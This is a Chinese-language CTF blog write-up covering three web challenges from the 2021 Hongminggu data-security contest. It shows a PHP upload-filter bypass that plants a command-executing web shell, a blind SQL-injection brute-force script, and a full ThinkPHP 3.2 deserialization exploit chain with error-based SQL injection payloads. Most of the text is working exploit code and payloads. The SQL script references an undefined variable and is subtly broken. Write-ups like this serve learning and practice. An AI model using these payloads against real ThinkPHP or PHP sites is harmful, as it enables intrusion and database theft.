---
title: 红明谷杯数据安全大赛web wp
date: 2021-04-07 20:17:33
updated: 2021-04-07 20:17:33
categories: Write up
---

红明谷杯数据安全大赛web write up<!--more-->

# write_shell

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

通过一下payload可以知道路径

```
?action=pwd
```

之后就是 `file_put_contents`利用了

虽然过滤了空格，我们可以通过`%09`进行绕过。

```
?action=upload&data=<?=`ls%09/`?>
```

可看到`flag`文件为`php`文件`!whatyouwantggggggg401.php`

由于过滤了`php`字符，可通过`*`通配符绕过

```
?action=upload&data=<?=`cat%09/!whatyouwantggggggg401*`?>
```



# happysql



![](http://img.npfs06.top/20210407113355.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

在登陆的位置存在sql注入，fuzz后发现，过滤了`if,空格、or,and,information,单引号,benchmark,sleep，=，li k,+,-`等关键字，闭合方式为双引号。



or和and 等逻辑运算符直接用`||`代替即可。等于号可以使用`regexp`或者`strcmp`,而字符串分割可以使用`locate`代替。`||`只要一边执行成功就能跳转到`home.php`

输入：

```
username: npfs"||0#
password: 123456
```

![](https://img.npfs06.top/20210407114630.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

输入：

```
username: whoami"||1#
password: 123456
```

成功登入，跳转到home.php

![](https://img.npfs06.top/20210407123509.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

盲注，因为regexp没有被过滤，考虑正则注入，但是由于又过滤了`-`等flag中可能出现的字符，所有这里我们使用hex绕过

```python
import requests
import string
import binascii

s = string.digits + string.ascii_uppercase + string.ascii_lowercase + "-" + "}"
url = ""
flag = "flag{"

while True:
    for i in s:
        r = flag + i
        data = {
            "username" : 'admin"||(select/**/*/**/from/**/f1ag)/**/regexp/**/0x' + binascii.hexlify(("^" + result + i).encode()).decode() + '#',
            "password" : ""
        }
        res = requests.post(url, data=data)
        if "home.php" in res.text:
            flag += i
            print(flag)
            break
```

```mysql
//regexp

查找name字段中以'st'为开头的所有数据：
mysql> SELECT name FROM person_tbl WHERE name REGEXP '^st';
```



## east_tp

可以通过关键词搜索到ThinkPHP v3.2.* 版本的一个反序列化漏洞，基本上照着做就可以了https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA



EXP：

```php
<?php
namespace Think\Db\Driver{
    use PDO;
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true    // 开启才能读取文件
        );
        protected $config = array(
            "debug"    => 1,
            "database" => "",
            "hostname" => "127.0.0.1",
            "hostport" => "3306",
            "charset"  => "utf8",
            "username" => "root",
            "password" => "root"
        );
    }
}

namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
        private $img;

        public function __construct(){
            $this->img = new Memcache();
        }
    }
}

namespace Think\Session\Driver{
    use Think\Model;
    class Memcache{
        protected $handle;

        public function __construct(){
            $this->handle = new Model();
        }
    }
}

namespace Think{
    use Think\Db\Driver\Mysql;
    class Model{
        protected $options   = array();
        protected $pk;
        protected $data = array();
        protected $db = null;

        public function __construct(){
            $this->db = new Mysql();
            $this->options['where'] = '';
            $this->pk = 'id';
            $this->data[$this->pk] = array(
                // "table" => "mysql.user where  1=updatexml(1,concat(0x7e,(select left(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#",
                // "table" => "mysql.user where  1=updatexml(1,concat(0x7e,(select right(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#",
                // "table" => "mysql.user where  1=updatexml(1,concat(0x7e,(select left(group_concat(table_name),31) from information_schema.tables where table_schema='test'),0x7e),1)#",
                // "table" => "mysql.user where  1=updatexml(1,concat(0x7e,(select left(group_concat(column_name),31) from information_schema.columns where table_schema='test'),0x7e),1)#",
                 //"table" => "mysql.user where  1=updatexml(1,concat(0x7e,(select left(group_concat(flag),31) from test.flag),0x7e),1)#",
                "table" => "mysql.user where  1=updatexml(1,concat(0x7e,(select right(group_concat(flag),31) from test.flag),0x7e),1)#",
                "where" => "1=1"
            );
        }
    }
}

namespace {
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));

}
```



![](https://img.npfs06.top/20210416231548.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)